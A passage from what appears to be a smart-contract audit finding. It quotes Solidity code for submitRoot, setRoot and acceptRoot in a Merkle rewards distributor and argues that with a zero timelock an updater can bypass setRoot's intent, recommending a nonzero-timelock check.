        require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);


        pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});
      
        emit EventsLib.PendingRootSet(msg.sender, newRoot, newIpfsHash);
    }
```

While in the function setroot

```
    /// @notice Forces update the root of a given distribution (bypassing the timelock).
    /// @param newRoot The new merkle root.
    /// @param newIpfsHash The optional ipfs hash containing metadata about the root (e.g. the merkle tree itself).
    /// @dev This function can only be called by the owner of the distribution or by updaters if there is no timelock.
    /// @dev Set to bytes32(0) to remove the root.
    function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        require(newRoot != root || newIpfsHash != ipfsHash, ErrorsLib.ALREADY_SET);
        require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);

        _setRoot(newRoot, newIpfsHash);
    }
```

Itnis intended that the updater uses this function when it wants to force set root. 

But the challenge with this is that the updater can perfrom the purpose of the second with the first pretty fine, like so. 

If the updater calls the `submitRoot` and after that executes calls `acceptRoot` 

```
    function acceptRoot() external {
        require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);
        require(block.timestamp >= pendingRoot.validAt, ErrorsLib.TIMELOCK_NOT_EXPIRED);

        _setRoot(pendingRoot.root, pendingRoot.ipfsHash);
    }
```

it will accept the root forcefully as the `setroot` function was intended to. 

This is becuase the `setroot` 

```
 require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);
```

 has the requirement that is timelock is zero it should execute, and in the `submitroot` when timelock is zero, it means that 

 ` pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});`

 it evaluates to the current execution time,  because if timelock is zero, then `timelock + block.timestamp == block.timestamp` 

which is a requirement to accept pending root 

```
require(block.timestamp >= pendingRoot.validAt, ErrorsLib.TIMELOCK_NOT_EXPIRED);
```

**Recommendation**

Cheeck that timlock is not zero when submitting root. 




